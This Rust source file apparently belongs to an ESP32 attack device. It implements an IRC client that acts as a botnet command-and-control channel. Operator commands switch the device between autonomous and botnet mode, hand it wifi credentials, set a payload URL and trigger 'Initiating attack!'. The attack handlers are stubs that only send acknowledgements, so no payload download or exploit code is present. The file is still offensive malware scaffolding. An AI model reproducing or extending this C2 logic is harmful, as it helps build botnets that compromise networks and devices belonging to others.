use esp_idf_hal::delay::FreeRtos;
use crate::irc_client::tcp_client::TcpClient;

pub struct IRClient {
    server_name: String,
    channel_name: String,
    username: String,
    tcp_client: TcpClient,
}

impl IRClient {
    pub fn new(server_address: String, server_port: usize, server_name: String, channel_name: String, username: String) -> IRClient {
        IRClient {
            server_name,
            channel_name,
            username,
            tcp_client: TcpClient::new(server_address, server_port),
        }
    }

    pub fn send_nick(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("NICK {}\r\n", self.username))
    }

    pub fn send_user(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("USER {} * * :{}\r\n", self.username, self.username))
    }

    pub fn register_user(&mut self) -> anyhow::Result<()> {
        loop {
            self.send_nick()?;
            self.send_user()?;
            let response = self.tcp_client.receive_response()?;
            if response.contains("433") {
                self.username.push('_');
            } else {
                break;
            }
        }

        Ok(())
    }

    pub fn join_channel(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("JOIN {}\r\n", self.channel_name))
    }

    pub fn send_pong(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("PONG {}\r\n", self.server_name))
    }

    pub fn send_message(&mut self, message: &str) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("PRIVMSG {} :{}\r\n", self.channel_name, message))
    }

    pub fn init_timer(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command("Initializing device...")?;
        FreeRtos::delay_ms(1000);
        Ok(())
    }

    pub fn send_help(&mut self) -> anyhow::Result<()> {
        self.send_message("MODE,<[AUTO,BOT]> - change between autonomous and botnet mode")?;
        self.send_message("WIFI,<SSID>,<PASS> - send wifi credentials")?;
        self.send_message("PAYLOAD,<URL> - send url of the payload")?;
        self.send_message("INIT - initiate the payload")?;
        self.send_message("IRC_DISCONN - disconnect from server")?;
        self.send_message("TERMINATE - terminate the device")?;
        Ok(())
    }

    pub fn send_quit(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command("QUIT\r\n")
    }

    pub fn handle_messages(&mut self) -> anyhow::Result<()> {
        self.init_timer()?;

        loop {
            let response = self.tcp_client.receive_response()?;
            match response.to_uppercase().as_str() {
                comm if comm.contains("PING") => self.send_pong()?,
                comm if comm.contains(":HELP") => self.send_help()?,
                comm if comm.contains(":MODE,AUTO") => self.send_message("Switching to autonomous mode!")?,
                comm if comm.contains(":MODE,BOT") => self.send_message("Switching to botnet mode!")?,
                comm if comm.contains(":IRC_DISCONN") || comm.contains(":TERMINATE") => {
                    self.send_message("Disconnecting from server!")?;
                    return Ok(());
                },
                comm if comm.contains(":WIFI,") => self.send_message("Received new wifi credentials, connecting...")?,
                comm if comm.contains(":PAYLOAD,") => self.send_message("Received new payload, downloading...")?,
                comm if comm.contains(":INIT") => self.send_message("Initiating attack!")?,
                _ => self.send_message("Unknown command received! Type HELP for list of commands")?
            }
        }
    }

    pub fn client_loop(&mut self) {
        self.tcp_client.connect_to_server().expect("Unable to connect to server");
        self.register_user().expect("Register user failed with error");
        self.join_channel().expect("Unable to join a channel");
        self.handle_messages().expect("Error while handling messages");
        self.send_quit().expect("Error while disconnecting from the server");
        self.tcp_client.close_stream().expect("Error while closing TCP stream");
    }
}